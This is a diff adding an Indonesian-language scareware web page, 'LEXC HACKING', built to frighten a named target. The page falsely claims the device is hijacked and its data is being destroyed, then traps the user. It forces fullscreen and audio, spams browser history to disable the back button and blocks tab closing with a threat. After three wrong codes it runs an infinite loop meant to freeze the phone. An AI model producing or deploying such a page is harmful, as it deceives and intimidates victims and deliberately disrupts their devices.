@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEM DIKUASAI - LEXC HACKING</title>
+    <style>
+        body { 
+            background-color: #000; color: #0f0; font-family: 'Courier New', monospace; 
+            height: 100vh; margin: 0; overflow: hidden; display: flex; 
+            justify-content: center; align-items: center; flex-direction: column; 
+            user-select: none; transition: background-color 0.1s;
+        }
+        
+        #matrix { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.4; }
+
+        .container { 
+            border: 2px solid #f00; padding: 30px; background: rgba(20, 0, 0, 0.9); 
+            text-align: center; box-shadow: 0 0 50px #f00; width: 85%; max-width: 400px; z-index: 10;
+        }
+        
+        .logo { 
+            font-size: 50px; font-weight: bold; text-shadow: 0 0 20px #f00; 
+            margin-bottom: 10px; animation: glitch 0.3s infinite; color: #f00;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); color: #0f0; }
+            40% { transform: translate(3px, -3px); color: #00f; }
+            100% { transform: translate(0); }
+        }
+
+        .warning-text { color: #fff; font-size: 14px; margin-bottom: 20px; }
+
+        input { 
+            background: #000; border: 1px solid #f00; color: #f00; 
+            padding: 15px; margin: 10px 0; text-align: center; width: 90%; 
+            font-size: 18px; font-weight: bold; outline: none;
+        }
+        
+        button { 
+            background: #f00; color: #000; border: none; padding: 15px 30px; 
+            cursor: pointer; font-weight: bold; width: 100%; font-size: 18px; 
+            text-transform: uppercase; transition: 0.2s;
+        }
+        button:active { background: #fff; }
+
+        .status { margin-top: 15px; font-size: 12px; color: #f00; font-weight: bold; }
+        
+        .progress-container { width: 100%; background: #222; border: 1px solid #f00; margin-top: 20px; height: 15px; }
+        #bar { width: 0%; height: 100%; background: #f00; transition: width 0.5s; }
+        #percent { font-size: 12px; color: #f00; margin-top: 5px; font-weight: bold; }
+
+        /* Overlay Kematian pas Nge-crash */
+        #deathScreen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: red; color: white; z-index: 9999; font-size: 40px;
+            justify-content: center; align-items: center; text-align: center; font-weight: bold;
+        }
+    </style>
+</head>
+<body onclick="initHacking()">
+
+    <canvas id="matrix"></canvas>
+
+    <div class="container" id="mainBox">
+        <div class="logo">LEXC HACKING</div>
+        <div class="warning-text">
+            ⚠️ PERANGKAT TELAH DIAMBIL ALIH ⚠️<br>
+            Jangan matikan perangkat atau kernel akan rusak permanen!
+        </div>
+        
+        <input type="password" id="pw" placeholder="KODE VVIP">
+        <button onclick="unlock()">VERIFIKASI</button>
+        
+        <div class="progress-container">
+            <div id="bar"></div>
+        </div>
+        <div id="percent">MENGHANCURKAN DATA: 0%</div>
+        
+        <div class="status" id="msg">ATTEMPTS LEFT: 3</div>
+    </div>
+
+    <div id="deathScreen">FATAL ERROR<br>SYSTEM CRASHED!</div>
+
+    <audio id="sfx" loop>
+        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        const KEY = "MAMAZ2026"; // Sandi lu Arga, telaso!
+        let attempts = 3;
+        let progress = 0;
+        let isStarted = false;
+
+        // 1. Inisialisasi Fullscreen & Audio
+        function initHacking() {
+            if (!isStarted) {
+                document.getElementById("sfx").play();
+                let el = document.documentElement;
+                if (el.requestFullscreen) el.requestFullscreen();
+                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                isStarted = true;
+            }
+        }
+
+        // 2. Fake Deleting Progress
+        const bar = document.getElementById('bar');
+        const percentText = document.getElementById('percent');
+        setInterval(() => {
+            if (progress < 99.9) {
+                progress += (Math.random() * 0.8);
+                if (progress > 99.9) progress = 99.9;
+                bar.style.width = progress + "%";
+                percentText.innerHTML = "MENGHANCURKAN DATA: " + progress.toFixed(1) + "%";
+            }
+        }, 800);
+
+        // 3. Logic Sandi Bener vs Sandi Salah (Browser Crash)
+        function unlock() {
+            let val = document.getElementById("pw").value;
+            if (val === KEY) {
+                // SANDI BENER: Otomatis berhenti dan balik!
+                alert("AKSES DITERIMA. MENGHENTIKAN PENGHANCURAN... 😈");
+                
+                // Coba history back 2 kali buat maksa keluar dari halaman ini
+                window.history.go(-2);
+                
+                // Kalau history back gagal, tembak langsung ke Google
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            } else {
+                // SANDI SALAH: Kurangin nyawa
+                attempts--;
+                if (attempts > 0) {
+                    document.getElementById("msg").innerHTML = `KODE SALAH! SISA PERCOBAAN: ${attempts} 🤬`;
+                    document.getElementById("pw").value = "";
+                } else {
+                    // JATAH HABIS: Eksekusi Browser Crash Logic (Resource Exhaustion)
+                    document.getElementById("mainBox").style.display = "none";
+                    document.getElementById("deathScreen").style.display = "flex";
+                    document.getElementById("sfx").playbackRate = 2.0; // Audio makin cepet & panik
+                    
+                    // Bikin HP target nge-freeze total! ☠️
+                    setTimeout(() => {
+                        while(true) {
+                            history.pushState(null, null, location.href);
+                            console.log("CRASHING SYSTEM... TELASO!");
+                        }
+                    }, 500);
+                }
+            }
+        }
+
+        // 4. Background Matrix
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = "LEXCHACKING01010101@#$%&*";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#f00"; // Hujan warnanya merah darah
+            ctx.font = fontSize + "px arial";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 33);
+
+        // 5. ANTI-BACK LOOP SUPER BRUTAL (SPAM HISTORY)
+        // Ini bakal nyepam history tiap 50 milidetik! Tombol back bakal lumpuh!
+        setInterval(function() {
+            history.pushState(null, null, location.href);
+        }, 50);
+
+        window.onpopstate = function () {
+            history.pushState(null, null, location.href);
+            // Kasih efek kejut kalau dia nekat mencet back
+            document.body.style.backgroundColor = "red";
+            setTimeout(() => document.body.style.backgroundColor = "black", 100);
+        };
+
+        // 6. Wake Lock (Anti-Sleep)
+        if ('wakeLock' in navigator) {
+            document.body.addEventListener('click', async () => {
+                try { await navigator.wakeLock.request('screen'); } 
+                catch (err) {}
+            });
+        }
+
+        // 7. ANTI-CLOSE TAB (JEBAKAN BROWSER)
+        // Bikin browser nahan tab biar gak gampang ditutup (X)
+        window.addEventListener("beforeunload", function (e) {
+            var msg = "PERINGATAN: KELUAR DARI HALAMAN INI AKAN MENGHANCURKAN KERNEL HP LU!";
+            (e || window.event).returnValue = msg;
+            return msg;
+        });
+    </script>
+</body>
+</html>
